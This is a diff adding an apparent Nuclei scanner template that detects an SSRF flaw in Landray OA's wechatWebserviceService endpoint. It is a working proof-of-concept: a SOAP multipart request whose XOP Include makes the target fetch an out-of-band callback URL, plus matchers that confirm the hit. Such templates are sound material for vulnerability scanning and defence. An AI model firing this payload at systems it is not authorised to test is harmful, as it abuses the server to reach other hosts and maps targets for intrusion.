@@ -1,0 +1,39 @@
+id: poc-yaml-landray-wechatwebserviceservice-ssrf
+info:
+  name: Landray OA wechatWebserviceService SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,ssrf
+
+http:
+  - raw:
+      - |
+        POST /sys/webservice/wechatWebserviceService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.wechat.third.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getAttachement>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="http://{{interactsh-url}}"/></count>
+                </arg0>
+            </web:getAttachement>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "意外的文本"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
